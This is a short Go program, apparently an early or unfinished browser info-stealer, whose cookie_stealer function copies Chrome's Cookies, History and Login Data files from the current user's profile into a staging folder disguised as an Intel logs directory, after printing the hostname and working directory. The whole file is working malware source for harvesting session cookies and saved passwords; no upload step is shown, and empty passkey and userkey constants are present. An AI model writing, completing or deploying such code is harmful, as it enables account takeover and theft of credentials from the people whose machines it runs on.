package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/user"
	"time"
)

const (
	safe_path = "C:\\Users\\Public\\Intel\\Logs"
	passkey   = ""
	userkey   = ""
	author    = "sn33r2"
)

//get targetip files
func get_targetip() {
	name, err := os.Hostname()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(name)
}

//create a dir
func create_dir() {
	err := os.MkdirAll(safe_path, 0711)
	if err != nil {
		log.Fatal(err)
	}
}

//returns Current working dir
func current_working_dir() {
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(dir)
}

//returns current user and ther info
func get_current_user() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return usr.HomeDir
}

func check(err error) {
	if err != nil {
		fmt.Println("Error ", err.Error())
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
}

func cookie_stealer() {
	current_user := get_current_user()
	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"

	var cookie_file string = "Cookies"
	var history string = "History"
	var data_login string = "Login Data"

	cp_cookie := cp + cookie_file
	cp_hist := cp + history
	cp_data_login := cp + data_login

	srcFile, err := os.Open(cp_cookie)
	check(err)
	defer srcFile.Close()

	new_path := safe_path + cookie_file

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)

	copyFiles(cp_cookie, cookie_file)
	copyFiles(cp_hist, history)
	copyFiles(cp_data_login, data_login)

}

func copyFiles(src string, concat string) {
	srcFile, err := os.Open(src)
	check(err)
	defer srcFile.Close()

	new_path := safe_path + concat

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)
}

func main() {
	current_working_dir()
	get_current_user()
	create_dir()
	get_targetip()
	cookie_stealer()
  //debug..
	time.Sleep(5 * time.Second)
}
